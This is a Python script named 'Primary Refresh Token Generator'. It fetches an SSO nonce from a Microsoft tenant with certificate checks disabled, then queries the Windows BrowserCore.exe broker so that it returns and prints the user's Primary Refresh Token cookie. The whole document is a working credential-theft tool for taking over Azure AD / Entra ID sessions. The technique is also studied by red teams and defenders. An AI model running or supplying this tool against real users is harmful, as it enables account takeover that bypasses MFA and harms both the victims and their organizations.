#!/usr/bin/env python3


import argparse
import subprocess
import struct
import json
import requests
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def getNonce(tenantId: str) -> str:
	url = f"https://login.microsoftonline.com/{tenantId}/oauth2/token"
	data = "grant_type=srv_challenge"
	response = requests.post(url=url, data=data, verify=False)
	nonce = response.json()
	return nonce["Nonce"]


def getPRT(nonce: str) -> str:
	process = subprocess.Popen([r"C:\Program Files\Windows Security\BrowserCore\browsercore.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
	inv = {}
	inv["method"] = "GetCookies"
	inv["sender"] = "https://login.microsoftonline.com"
	inv["uri"] = f"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce={nonce}"
	text = json.dumps(inv).encode("utf-8")
	encoded_length = struct.pack("=I", len(text))
	response = process.communicate(input=encoded_length + text)[0]
	prt = response[4:].decode("utf-8")
	print(prt)
	return prt


def main() -> None:
	parser = argparse.ArgumentParser(
		description='Primary Refresh Token Generator.',
		formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=40))
	parser.add_argument('-i', '--id',
						type=str,
						required=True,
						help='Tenant ID')
	args = parser.parse_args()
	tenantId = args.id
	
	nonce = getNonce(tenantId)
	prt = getPRT(nonce)
	

if __name__ == "__main__":
	main()
